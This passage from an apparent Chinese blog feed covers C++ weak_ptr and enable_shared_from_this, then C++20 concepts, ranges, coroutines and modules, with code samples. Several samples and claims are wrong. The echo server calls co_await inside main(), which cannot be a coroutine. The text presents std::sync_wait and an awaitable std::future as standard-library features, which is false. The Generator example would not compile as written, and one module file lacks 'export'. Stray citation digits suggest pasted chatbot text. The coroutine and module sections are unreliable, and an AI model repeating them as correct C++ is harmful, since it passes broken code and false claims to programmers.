sptr2 = sptr1-&gt;<span class="built_in">GetSPtr</span>();</span><br><span class="line"><span class="built_in">assert</span>(sptr1.<span class="built_in">use_count</span>() == <span class="number">2</span>);</span><br><span class="line"><span class="built_in">assert</span>(sptr2.<span class="built_in">use_count</span>() == <span class="number">2</span>);</span><br></pre></td></tr></table></figure><p>一般情况下，继承了 std::enable_shared_from_this 的子类，成员变量中增加了一个指向 this 的 weak_ptr。这个 weak_ptr 在第一次创建 shared_ptr 的时候会被初始化，指向 this。</p><p><img src="/.io//v2-fbbbc83da3c87fe48817a4cbda49ce03_1440w.webp" alt="img"></p><p>似乎继承了 std::enable_shared_from_this 的类都被强制必须通过 shared_ptr 进行管理。如果没有创建shared_ptr 直接调用shared_from_this()方法，将会报错。</p><h3 id="std-weak-ptr-lt-T-gt-：共享资源的观察者，需要和-std-shared-ptr-一起使用，不影响资源的生命周期。"><a href="#std-weak-ptr-lt-T-gt-：共享资源的观察者，需要和-std-shared-ptr-一起使用，不影响资源的生命周期。" class="headerlink" title="std::weak_ptr&lt;T&gt; ：共享资源的观察者，需要和 std::shared_ptr 一起使用，不影响资源的生命周期。"></a><code>std::weak_ptr&lt;T&gt;</code> ：共享资源的观察者，需要和 std::shared_ptr 一起使用，不影响资源的生命周期。</h3><p>std::weak_ptr 要与 std::shared_ptr 一起使用。 一个 std::weak_ptr 对象看做是 std::shared_ptr 对象管理的资源的观察者，它不影响共享资源的生命周期：</p><ol><li>如果需要使用 weak_ptr 正在观察的资源，可以将 weak_ptr 提升为 shared_ptr。</li><li>当 shared_ptr 管理的资源被释放时，weak_ptr 会自动变成 nullptr。</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">Observe</span><span class="params">(std::weak_ptr&lt;<span class="type">int</span>&gt; wptr)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">auto</span> sptr = wptr.<span class="built_in">lock</span>()) &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;value: &quot;</span> &lt;&lt; *sptr &lt;&lt; std::endl;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;wptr lock fail&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">std::weak_ptr&lt;<span class="type">int</span>&gt; wptr;</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">auto</span> sptr = std::<span class="built_in">make_shared</span>&lt;<span class="type">int</span>&gt;(<span class="number">111</span>);</span><br><span class="line">    wptr = sptr;</span><br><span class="line">    <span class="built_in">Observe</span>(wptr);  <span class="comment">// sptr 指向的资源没被释放，wptr 可以成功提升为 shared_ptr</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">Observe</span>(wptr);  <span class="comment">// sptr 指向的资源已被释放，wptr 无法提升为 shared_ptr</span></span><br></pre></td></tr></table></figure><p>当 shared_ptr 析构并释放共享资源的时候，只要 weak_ptr 对象还存在，控制块就会保留，weak_ptr 可以通过控制块观察到对象是否存活。</p><p><img src="/.io//v2-5f40e9422551bb244753e87ef43d1e64_1440w.webp" alt="img"></p><p><img src="/.io//v2-f387c7135acf9101029fc4981ce2269b_1440w.webp" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> C++ </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>c++20</title>
      <link href="/2023/03/22/c-20/"/>
      <url>/2023/03/22/c-20/</url>
      
        <content type="html"><![CDATA[<h2 id="语法糖"><a href="#语法糖" class="headerlink" title="语法糖"></a>语法糖</h2><p>语法糖是指计算机语言中添加的某种语法，这种语法对语言的功能并没有影响，但是更方便程序员使用。</p><p>C++也有很多语法糖，比如运算符重载、lambda表达式、auto类型推导等。这些语法糖可以让我们的代码更简洁、更易读、更高效。例如，下面两种写法是等价的：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">  sum += i;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">auto</span> i : &#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>&#125;) &#123;</span><br><span class="line">  sum += i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>c++11、20新特性大多数都是语法糖</p><h2 id="c-20"><a href="#c-20" class="headerlink" title="c++20"></a>c++20</h2><p>C++20有很多新的特性，其中最重要的四个是概念、范围、协程和模块。概念可以让我们定义泛型函数或类的约束条件，范围可以让我们更方便地操作容器和迭代器，协程可以让我们编写异步代码，模块可以让我们更高效地组织代码。除此之外，C++20还有一些其他的新特性，比如三向比较运算符、指定初始化、日历和时区功能等。</p><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p>概念是一种用来约束模板类型的语法糖。我们可以用concept关键字来定义一个概念，然后用requires关键字来指定一个模板参数必须满足某个概念。例如，我们可以定义一个Integral概念，表示一个类型必须是整数类型</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="keyword">concept</span> Integral = std::is_integral_v&lt;T&gt;;</span><br><span class="line"><span class="comment">// 然后我们可以用这个概念来约束一个函数模板的参数类型</span></span><br><span class="line"><span class="function"><span class="keyword">template</span>&lt;Integral T&gt;</span></span><br><span class="line"><span class="function">T <span class="title">add</span><span class="params">(T a, T b)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样，如果我们传入非整数类型的参数，就会在编译时报错。</p><p>概念可以自定义，使用requires关键字</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="keyword">concept</span> Sortable = <span class="built_in">requires</span>(T a) &#123;</span><br><span class="line">  &#123; std::<span class="built_in">sort</span>(a.<span class="built_in">begin</span>(), a.<span class="built_in">end</span>()) &#125; -&gt; std::same_as&lt;<span class="type">void</span>&gt;;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">// 这个概念要求T类型有begin()和end()方法，并且可以用std::sort函数进行排序</span></span><br></pre></td></tr></table></figure><p>标准库中提供了上百种常用的概念，放在和等头文件中。比较常用的一些有：std::same_as, std::derived_from, std::convertible_to, std::floating_point等</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;concepts&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">template</span>&lt;std::integral T&gt;</span></span><br><span class="line"><span class="function">T <span class="title">add</span><span class="params">(T a, T b)</span> </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> a + b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="范围"><a href="#范围" class="headerlink" title="范围"></a>范围</h3><p>范围是C++20加入的一个重要的库功能，它提供了描述范围和对范围的操作的统一接口。一个范围是可以循环访问的任何东西，比如一个容器或者一个数组。我们可以用begin()和end()函数来获取一个范围的起始和终止位置。我们也可以用基于范围的for语句来遍历一个范围中的所有元素。例如，我们可以这样打印一个vector中的所有元素：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  std::vector&lt;<span class="type">int</span>&gt; v = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">auto</span> x : v) &#123;</span><br><span class="line">    std::cout &lt;&lt; x &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>自定义的类型，满足range概念，都可以使用范围的特性。即它可以用begin()和end()函数来获取其起始和终止位置。这两个函数返回的对象必须是迭代器或者哨兵。迭代器是可以用++和*操作符来遍历元素的对象，哨兵是可以用&#x3D;&#x3D;操作符来判断是否到达范围的末尾的对象</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ranges&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">IntRange</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">  <span class="built_in">IntRange</span>(<span class="type">int</span> a, <span class="type">int</span> b) : <span class="built_in">a_</span>(a), <span class="built_in">b_</span>(b) &#123;&#125;</span><br><span class="line">  <span class="comment">// 迭代器</span></span><br><span class="line">  <span class="keyword">class</span> <span class="title class_">Iterator</span> &#123;</span><br><span class="line">  <span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Iterator</span>(<span class="type">int</span> x) : <span class="built_in">x_</span>(x) &#123;&#125;</span><br><span class="line">    <span class="type">int</span> <span class="keyword">operator</span>*() <span class="type">const</span> &#123; <span class="keyword">return</span> x_; &#125;</span><br><span class="line">    Iterator&amp; <span class="keyword">operator</span>++() &#123; ++x_; <span class="keyword">return</span> *<span class="keyword">this</span>; &#125;</span><br><span class="line">    <span class="type">bool</span> <span class="keyword">operator</span>==(<span class="type">const</span> Iterator&amp; other) <span class="type">const</span> &#123; <span class="keyword">return</span> x_ == other.x_; &#125;</span><br><span class="line">    <span class="type">bool</span> <span class="keyword">operator</span>!=(<span class="type">const</span> Iterator&amp; other) <span class="type">const</span> &#123; <span class="keyword">return</span> !(*<span class="keyword">this</span> == other); &#125;</span><br><span class="line">  <span class="keyword">private</span>:</span><br><span class="line">    <span class="type">int</span> x_;</span><br><span class="line">  &#125;;</span><br><span class="line">  <span class="comment">// 哨兵</span></span><br><span class="line">  <span class="keyword">class</span> <span class="title class_">Sentinel</span> &#123;</span><br><span class="line">  <span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Sentinel</span>(<span class="type">int</span> y) : <span class="built_in">y_</span>(y) &#123;&#125;</span><br><span class="line">    <span class="type">bool</span> <span class="keyword">operator</span>==(<span class="type">const</span> Iterator&amp; iter) <span class="type">const</span> &#123; <span class="keyword">return</span> *iter == y_; &#125;</span><br><span class="line">    <span class="type">bool</span> <span class="keyword">operator</span>!=(<span class="type">const</span> Iterator&amp; iter) <span class="type">const</span> &#123; <span class="keyword">return</span> !(*<span class="keyword">this</span> == iter); &#125;</span><br><span class="line">  <span class="keyword">private</span>:</span><br><span class="line">    <span class="type">int</span> y_;</span><br><span class="line">  &#125;;</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// begin()和end()函数</span></span><br><span class="line">  <span class="function">Iterator <span class="title">begin</span><span class="params">()</span> <span class="type">const</span> </span>&#123; <span class="keyword">return</span> <span class="built_in">Iterator</span>(a_); &#125;</span><br><span class="line">  <span class="function">Sentinel <span class="title">end</span><span class="params">()</span> <span class="type">const</span> </span>&#123; <span class="keyword">return</span> <span class="built_in">Sentinel</span>(b_); &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">  <span class="type">int</span> a_, b_;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="function">IntRange <span class="title">r</span><span class="params">(<span class="number">1</span>,<span class="number">5</span>)</span></span>;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">auto</span> x : r) &#123;</span><br><span class="line">    std::cout &lt;&lt; x &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="协程"><a href="#协程" class="headerlink" title="协程"></a>协程</h3><p>协程是一种可以在执行过程中被挂起和恢复的函数。它可以用来实现异步编程，提高性能和并发度。</p><p>C++20中引入了三个新的关键字，co_await，co_yield和co_return，用来标记一个函数是协程。这些关键字只是语法糖，编译器会将协程的上下文打包成一个对象，并让未执行完的协程先返回给调用者。要实现一个C++20协程，还需要提供两个鸭子类型，promise type和awaiter type，分别用来管理协程的生命周期和等待机制。</p><p>例如，我们可以实现一个简单的生成器协程，它每次产生一个整数：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;coroutine&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// promise type</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">Generator</span> &#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">promise_type</span> &#123;</span><br><span class="line">    <span class="type">int</span> current_value;</span><br><span class="line">    <span class="function">std::suspend_always <span class="title">yield_value</span><span class="params">(<span class="type">int</span> value)</span> </span>&#123;</span><br><span class="line">      <span class="keyword">this</span>-&gt;current_value = value;</span><br><span class="line">      <span class="keyword">return</span> &#123;&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function">std::suspend_always <span class="title">initial_suspend</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> &#123;&#125;; &#125;</span><br><span class="line">    <span class="function">std::suspend_always <span class="title">final_suspend</span><span class="params">()</span> <span class="keyword">noexcept</span> </span>&#123; <span class="keyword">return</span> &#123;&#125;; &#125;</span><br><span class="line">    <span class="function">Generator <span class="title">get_return_object</span><span class="params">()</span> </span>&#123; </span><br><span class="line">      <span class="keyword">return</span> Generator&#123;std::coroutine_handle&lt;promise_type&gt;::<span class="built_in">from_promise</span>(*<span class="keyword">this</span>)&#125;; </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">unhandled_exception</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// awaiter type</span></span><br><span class="line">  <span class="function"><span class="type">bool</span> <span class="title">move_next</span><span class="params">()</span> </span>&#123; </span><br><span class="line">    p.<span class="built_in">resume</span>(); </span><br><span class="line">    <span class="keyword">return</span> !p.<span class="built_in">done</span>(); </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="type">int</span> <span class="title">current_value</span><span class="params">()</span> </span>&#123; <span class="keyword">return</span> p.<span class="built_in">promise</span>().current_value; &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">  std::coroutine_handle&lt;promise_type&gt; p;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 协程函数</span></span><br><span class="line"><span class="function">Generator <span class="title">generator</span><span class="params">(<span class="type">int</span> start = <span class="number">0</span>)</span> </span>&#123;</span><br><span class="line">  <span class="type">int</span> i = start;</span><br><span class="line">  <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">    <span class="keyword">co_yield</span> i++;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">auto</span> g = <span class="built_in">generator</span>(<span class="number">1</span>);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; ++i) &#123;</span><br><span class="line">    g.<span class="built_in">move_next</span>();</span><br><span class="line">    std::cout &lt;&lt; g.<span class="built_in">current_value</span>() &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用协程实现异步网络编程的主要优点是可以用同步的语法写出异步的代码，提高代码的可读性和可维护性1。要使用协程实现异步网络编程，需要以下几个步骤：</p><ul><li><p>使用标准库中提供的std::jthread或std::thread创建一个或多个工作线程，用来执行协程任务。</p></li><li><p>使用标准库中提供的std::coroutine_handle或自定义的协程句柄类型，管理协程的生命周期和调度。</p></li><li><p>使用标准库中提供的std::future或自定义的awaiter类型，等待异步操作完成并获取结果。</p></li><li><p>使用标准库中提供的std::sync_wait或自定义的同步等待函数，等待所有协程任务完成后退出程序。</p></li></ul><p>例如，我们可以使用一个简单的网络框架ZED3，它提供了一些基本的异步IO操作，并封装了协程句柄和awaiter类型。我们可以用以下代码实现一个简单的回显服务器：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;zed/net.hpp&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> zed;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="comment">// 创建一个io_context对象</span></span><br><span class="line">  io_context ctx;</span><br><span class="line">  <span class="comment">// 创建一个工作线程</span></span><br><span class="line">  <span class="function">std::jthread <span class="title">th</span><span class="params">([&amp;ctx]() &#123; ctx.run(); &#125;)</span></span>;</span><br><span class="line">  <span class="comment">// 创建一个tcp服务器</span></span><br><span class="line">  <span class="function">tcp_server <span class="title">server</span><span class="params">(ctx)</span></span>;</span><br><span class="line">  <span class="comment">// 绑定端口</span></span><br><span class="line">  server.<span class="built_in">bind</span>(<span class="number">8080</span>);</span><br><span class="line">  <span class="comment">// 开始监听</span></span><br><span class="line">  server.<span class="built_in">listen</span>();</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="comment">// 接受连接，并返回一个tcp_socket对象</span></span><br><span class="line">      <span class="keyword">auto</span> socket = <span class="keyword">co_await</span> server.<span class="built_in">accept</span>();</span><br><span class="line">      std::cout &lt;&lt; <span class="string">&quot;New connection from &quot;</span> &lt;&lt; socket.<span class="built_in">remote_endpoint</span>() &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">      <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="comment">// 接收数据，并返回接收到的字节数</span></span><br><span class="line">        <span class="keyword">auto</span> n = <span class="keyword">co_await</span> socket.<span class="built_in">recv</span>();</span><br><span class="line">        <span class="keyword">if</span> (n == <span class="number">0</span>) <span class="keyword">break</span>; <span class="comment">// 连接断开</span></span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;Received &quot;</span> &lt;&lt; n &lt;&lt; <span class="string">&quot; bytes\n&quot;</span>;</span><br><span class="line">        <span class="comment">// 发送数据，并返回发送出去的字节数</span></span><br><span class="line">        <span class="keyword">auto</span> m = <span class="keyword">co_await</span> socket.<span class="built_in">send</span>(n);</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;Sent &quot;</span> &lt;&lt; m &lt;&lt; <span class="string">&quot; bytes\n&quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      std::cout &lt;&lt; <span class="string">&quot;Connection closed\n&quot;</span>;</span><br><span class="line">    &#125; <span class="built_in">catch</span> (<span class="type">const</span> std::exception&amp; e) &#123;</span><br><span class="line">      std::cerr &lt;&lt; e.<span class="built_in">what</span>() &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="模块"><a href="#模块" class="headerlink" title="模块"></a>模块</h3><p>C++20模块是一种新的代码组织和重用的方式，它可以替代传统的头文件和翻译单元。#include 多个头文件时编译很慢，使用 module 相当于直接调用编译好的二进制文件，这个二进制文件中描述了这个 module 导出的函数、类、模板等。模块可以提高编译速度，避免宏污染，隐藏实现细节，简化依赖关系等优点。要使用模块，需要以下几个步骤：</p><ul><li><p>在源文件中使用module关键字声明一个模块，并指定模块名。</p></li><li><p>在源文件中使用export关键字导出需要对外提供的符号。</p></li><li><p>在其他源文件中使用import关键字导入需要使用的模块。</p></li><li><p>使用支持模块的编译器编译源文件，并生成相应的模块接口文件和目标文件。</p></li></ul><p>例如，我们可以用以下代码定义一个名为hello的模块：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// hello.cppm</span></span><br><span class="line"><span class="keyword">module</span> hello; <span class="comment">// 声明一个名为hello的模块</span></span><br><span class="line"><span class="function"><span class="keyword">export</span> <span class="type">void</span> <span class="title">say_hello</span><span class="params">()</span></span>; <span class="comment">// 导出一个名为say_hello的函数</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">say_hello</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  std::cout &lt;&lt; <span class="string">&quot;Hello, world!\n&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后我们可以在另一个源文件中导入并使用这个模块：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// main.cpp</span></span><br><span class="line"><span class="keyword">import</span> hello; <span class="comment">// 导入hello模块</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="built_in">say_hello</span>(); <span class="comment">// 调用say_hello函数</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>子模块是一种在逻辑上划分模块的方法，它可以让用户选择性地导入模块的一部分或全部内容。子模块的命名规则中允许点存在于模块名字当中，但点并不代表语法上的从属关系，而只是帮助程序员理解模块间的逻辑关系。</p><p>例如，我们可以用以下代码定义一个名为hello.sub_a的子模块：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// hello.sub_a.cppm</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">module</span> hello.sub_a; <span class="comment">// 声明一个名为hello.sub_a的子模块</span></span><br><span class="line"><span class="function"><span class="keyword">export</span> <span class="type">void</span> <span class="title">say_hello_sub_a</span><span class="params">()</span></span>; <span class="comment">// 导出一个名为say_hello_sub_a的函数</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">say_hello_sub_a</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  std::cout &lt;&lt; <span class="string">&quot;Hello, sub a!\n&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后我们可以在另一个源文件中定义一个名为hello.sub_b的子模块：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// hello.sub_b.cppm</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">module</span> hello.sub_b; <span class="comment">// 声明一个名为hello.sub_b的子模块</span></span><br><span class="line"><span class="function"><span class="keyword">export</span> <span class="type">void</span> <span class="title">say_hello_sub_b</span><span class="params">()</span></span>; <span class="comment">// 导出一个名为say_hello_sub_b的函数</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">say_hello_sub_b</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  std::cout &lt;&lt; <span class="string">&quot;Hello, sub b!\n&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后我们可以在另一个源文件中定义一个名为hello的父模块，它导出了两个子模块：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// hello.cppm</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">module</span> hello; <span class="comment">// 声明一个名为hello的父模块</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">import</span> hello.sub_a; <span class="comment">// 导出并导入hello.sub_a子模块</span></span><br><span class="line"><span class="keyword">export</span> <span class="keyword">import</span> hello.sub_b; <span class="comment">// 导出并导入hello.sub_b子模块</span></span><br></pre></td></tr></table></figure><p>这样，用户就可以根据需要导入不同的子模块或父模块：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// main.cpp</span></span><br><span class="line"><span class="keyword">import</span> hello; <span class="comment">// 